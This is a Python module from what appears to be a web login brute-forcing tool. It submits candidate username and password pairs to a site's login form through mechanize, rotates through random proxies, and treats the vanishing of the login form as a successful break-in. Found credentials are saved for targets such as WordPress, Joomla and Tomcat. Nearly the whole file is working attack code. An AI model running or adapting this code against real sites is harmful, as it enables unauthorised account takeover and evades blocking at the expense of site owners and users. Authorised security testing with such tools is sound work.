import mechanize
from core.tbrowser import parseLoginForm, startBrowser
from core.utils import printf
from core.actions import randomFromList

def check_condition(options, proc, loginInfo):

	"""
		Check logged in successfully condition.
		This function will check SQL injection as well
			return 0 -> False
			return 1 -> True
			return 2 -> Should be SQL Injection error-based
	"""
	if options.panel_url:
		# User provided panel url (/wp-admin/ for example, repopen this url to check sess)
		proc.open(options.panel_url, timeout = options.timeout)
		if parseLoginForm(proc.forms()) != loginInfo:
			return 1
		else:
			return 0
	else:
		# User provided direct login URL (/wp-login.php).
		"""
		cases: dvwa (login.php), tomcat (panel), joomla (panel)
		found_no_login
		if url == login_url:
			-> true / error page / waf page
			reopen(url) -> login failed (dvwa, wordpress), wrong

		if url == panel_url (tomcat, joomla):
			-> true / error page (tomcat) / waf page 
			reopen(url) -> login_success, true

		//if loged_in -> error_page:
		//	always true, but wrong
		"""
		# DEBUG
		# proc.open(options.url)
		# if parseLoginForm(proc.forms()) != loginInfo:
		# 	return 1
		# else:
		# 	return 0
		return 1


def submit(options, loginInfo, tryCred, result):

	#	Get login form field informations
	
	frmLoginID, frmFields = loginInfo
	tryPassword, tryUsername = tryCred

	proc = startBrowser()
	
	# for cred in list(result.queue):
	# 	if "--reauth" not in options.extras:
	# 		if tryUsername == cred[0]:
	# 			return True # don't run if find password of username
	# 	else:
	# 		if tryUsername == cred[1]:
	# 			return True # don't run if find password of username
	for cred in list(result.queue):
		if tryUsername == cred[1]:
			return True
	
	if options.proxy:
		# Set proxy connect
		proxyAddr = randomFromList(options.proxy)
		proc.set_proxies({"http": proxyAddr})
	
	try:

		proc.open(options.login_url, timeout = options.timeout)

		#	Select login form

		proc.select_form(nr = frmLoginID)
		
		# FILLS ALL FIELDS https://stackoverflow.com/a/5389578
		
		for field, cred in zip(frmFields, tryCred):
			proc.form[field] = cred

		#page_title = proc.title()
		#	Send request
		proc.submit()

		if options.verbose:
			if options.proxy:
				printf("[+] Trying: %s through %s" %([tryUsername, tryPassword],proxyAddr), 'norm')
			else:
				printf("[+] Trying: %s" %([tryUsername, tryPassword]), 'norm')
		
		#	Reload the browser. For javascript redirection and others...
		# proc.reload()
		#	If no login form -> maybe success. Check conditions
		
		if parseLoginForm(proc.forms()) != loginInfo:
			test_result = check_condition(options, proc, loginInfo)
			

			if test_result:
				printf("[*] Page title: ['%s']" %(proc.title()), "good")
				
				# "If we tried login form with username+password field"
				if tryUsername:
					printf("[*] Found: %s" %([tryUsername, tryPassword]), "good")
				# "Else If we tried login form with password field only"
				else:
					printf("[*] Found: %s" %([tryPassword]), "good")
				# "End of condition block"
				
				# "Check for Extras option reauth", return result w/ right format
				# if "--reauth" not in options.extras:
				# 	result.put([tryUsername, tryPassword])
				# else:
				# 	result.put([options.url.split("/")[2], tryUsername, tryPassword])
				result.put([options.url, tryUsername, tryPassword])
			
			else:
				# Possibly Error. But sometime it is true
				if options.verbose:
					printf("[x] Get error page: %s" %([tryUsername, tryPassword]), "bad")
					printf("[x] Page title: ['%s']" %(proc.title()), "bad")
		
		# "Login form is still there. Oops"
		else:
			if options.verbose:
				if options.proxy:
					printf(
						"[-] Failed: %s through %s" %([tryUsername, tryPassword], proxyAddr),
						"bad"
					)
				else:
					printf(
						"[-] Failed: %s" %([tryUsername, tryPassword]),
						"bad"
					)
		return True

	except Exception as error:
		"""
			Sometimes, web servers return error code because of bad configurations,
			but our cred is true.
			This code block showing information, for special cases
		"""		

		try:
			# Unauthenticated
			if error.code == 401:
				if options.verbose:
					printf("[-] Failed: %s" %([tryUsername, tryPassword]), "bad")
			# Server misconfiguration? Panel URL is deleted or wrong
			elif error.code == 404:
				printf("[x] %s: %s" %(error, tryCred[::-1]), "bad")
				if options.verbose:
					printf("   %s" %(proc.geturl()), "bad")
			# Other error code
			else:
				if options.verbose:
					printf("[x] (%s): %s" %(proc.geturl(), tryCred[::-1]), "bad")
		except:
			# THIS BLOCKED BY WAF
			printf("[x] Loginbrute: %s" %(error), "bad")
	
		return False

	finally:
		proc.close()